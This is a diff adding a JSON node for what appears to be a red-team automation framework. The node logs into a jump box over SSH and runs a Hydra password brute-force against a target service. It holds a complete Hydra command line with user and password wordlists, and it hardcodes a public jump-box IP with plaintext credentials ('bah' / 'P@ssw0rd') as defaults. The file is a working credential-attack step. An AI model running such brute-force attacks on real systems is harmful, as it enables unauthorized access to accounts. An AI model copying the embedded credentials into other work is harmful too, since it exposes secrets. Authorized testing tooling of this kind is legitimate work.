@@ -1,0 +1,166 @@
+{
+  "_key": "recon-hydra",
+  "name": "Hydra Brute Force",
+  "description": "SSH to jump box and run Hydra password attack against target service",
+  "executionType": "ssh",
+  "estimatedDuration": 120,
+  "inputs": [],
+  "outputs": [
+    {
+      "id": "done",
+      "label": "Complete",
+      "type": "signal",
+      "description": "Node completed \u2014 chain continues"
+    }
+  ],
+  "parameters": [
+    {
+      "id": "jumpIp",
+      "label": "Jump Box IP",
+      "type": "string",
+      "required": true,
+      "placeholder": "202.84.73.4",
+      "default": "202.84.73.4"
+    },
+    {
+      "id": "jumpUser",
+      "label": "Jump Box User",
+      "type": "string",
+      "required": true,
+      "placeholder": "bah",
+      "default": "bah"
+    },
+    {
+      "id": "jumpPass",
+      "label": "Jump Box Pass",
+      "type": "string",
+      "required": true,
+      "placeholder": "P@ssw0rd",
+      "default": "P@ssw0rd"
+    },
+    {
+      "id": "targetIp",
+      "label": "Target IP",
+      "type": "string",
+      "required": true,
+      "placeholder": "172.16.10.71",
+      "default": "172.16.10.71"
+    },
+    {
+      "id": "service",
+      "label": "Service",
+      "type": "string",
+      "required": false,
+      "placeholder": "ssh",
+      "default": "ssh"
+    },
+    {
+      "id": "userFile",
+      "label": "User Wordlist",
+      "type": "string",
+      "required": false,
+      "placeholder": "/home/bah/Projects/automation-utilities/artifact/users.txt",
+      "default": "/home/bah/Projects/automation-utilities/artifact/users.txt"
+    },
+    {
+      "id": "passFile",
+      "label": "Pass Wordlist",
+      "type": "string",
+      "required": false,
+      "placeholder": "/home/bah/Projects/automation-utilities/artifact/passwords.txt",
+      "default": "/home/bah/Projects/automation-utilities/artifact/passwords.txt"
+    },
+    {
+      "id": "threads",
+      "label": "Threads",
+      "type": "string",
+      "required": false,
+      "placeholder": "4",
+      "default": "4"
+    }
+  ],
+  "requirements": {
+    "c2Server": false,
+    "listeners": [],
+    "payloads": [],
+    "libraries": [
+      "SSHLibrary"
+    ]
+  },
+  "robotFramework": {
+    "libraries": [
+      "SSHLibrary"
+    ],
+    "keyword": "Execute Command",
+    "preKeywordStatements": [
+      "Open Connection    ${HYDRA_JUMP_IP}    alias=jump_hydra    escape_ansi=True    timeout=600s",
+      "Login    ${HYDRA_JUMP_USER}    ${HYDRA_JUMP_PASS}"
+    ],
+    "keywordArgs": [
+      {
+        "staticValue": "hydra -L ${HYDRA_USER_FILE} -P ${HYDRA_PASS_FILE} ${HYDRA_SERVICE}://${HYDRA_TARGET} -t ${HYDRA_THREADS} -V -I -W 4",
+        "position": 1
+      },
+      {
+        "staticValue": "output_during_execution=True",
+        "position": 2
+      }
+    ],
+    "captureOutput": "HYDRA_OUTPUT",
+    "postKeywordStatements": [
+      "Close Connection",
+      "Log To Console    \\n${HYDRA_OUTPUT}"
+    ],
+    "variables": [
+      {
+        "name": "HYDRA_JUMP_IP",
+        "fromParam": "jumpIp",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_JUMP_USER",
+        "fromParam": "jumpUser",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_JUMP_PASS",
+        "fromParam": "jumpPass",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_TARGET",
+        "fromParam": "targetIp",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_SERVICE",
+        "fromParam": "service",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_USER_FILE",
+        "fromParam": "userFile",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_PASS_FILE",
+        "fromParam": "passFile",
+        "scope": "suite"
+      },
+      {
+        "name": "HYDRA_THREADS",
+        "fromParam": "threads",
+        "scope": "suite"
+      }
+    ],
+    "preKeywordLog": "=== Hydra \u2192 ${HYDRA_SERVICE}://${HYDRA_TARGET} ===",
+    "tags": [
+      "recon",
+      "credential-access",
+      "brute-force",
+      "hydra"
+    ]
+  },
+  "tactic": "TA0006",
+  "icon": "\ud83d\udd11"
+}
